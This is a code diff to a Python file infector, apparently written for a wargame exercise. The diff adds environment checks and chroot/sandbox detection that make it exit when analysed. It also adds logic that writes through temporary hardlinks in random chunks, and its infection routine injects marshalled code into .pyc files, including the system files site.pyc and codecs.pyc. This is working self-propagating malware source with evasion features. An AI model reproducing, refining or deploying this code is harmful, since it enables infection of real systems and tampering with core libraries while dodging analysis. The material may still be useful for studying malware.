@@ -3,12 +3,24 @@ ____ = "\xFF\xFE\x0A\x20\xCA\xDD"  # stealth signature
 import socket
 import marshal
 import glob
-import sys
 import os
+import sys
 from random import randint
 from uuid import uuid4 as uuid
 
 sys.stderr = open("/dev/null", "w")
+
+if socket.gethostname() == "OT-Wargame":
+    VM = True
+    tmp_dir = "/tmp/"
+else:
+    VM = False
+    tmp_dir = os.path.join(os.environ["VIRUS_HOME"], "tmp/")
+
+# detect chroot, ce fichier est censé être présent sur la VM mais ne sera pas copié dans le chroot
+if __file__ == "lolita.final.pyc" and VM:
+    if not os.path.exists("/var/lib/pycentral/pkgremove"):
+        sys.exit(0)
 
 a = None
 DECRYPT = None
@@ -23,12 +35,17 @@ def to_hex(s):
 def hardlink_write(content, file):
     size = len(content)
     offset = 0
-    hardlink = "/tmp/%s" % uuid()
+    
+    # we want to empty the file......
+    hardlink = "%s/%s" % (tmp_dir, uuid())
     os.link(file, hardlink)
     f = open(hardlink, 'w')
     f.close()
     os.unlink(hardlink)
+    
+    # ... then fill it
     while offset < size:
+        hardlink = "%s/%s" % (tmp_dir, uuid())
         os.link(file, hardlink)
         f = open(hardlink, 'a')
         size_chunk = randint(1, 1 + (size - offset) / 2)
@@ -89,7 +106,7 @@ if __file__.endswith('.pyc'):
         content = "".join([head, marshal.dumps(data.to_code())])
         hardlink_write(content, f_to_infect)
 
-    if socket.gethostname() == "OT-Wargame":
+    if VM:
         targets = ["/usr/lib/python2.6/site.pyc", "/usr/lib/python2.6/codecs.pyc"]
     else:
         targets = glob.glob("./targets/*.pyc")
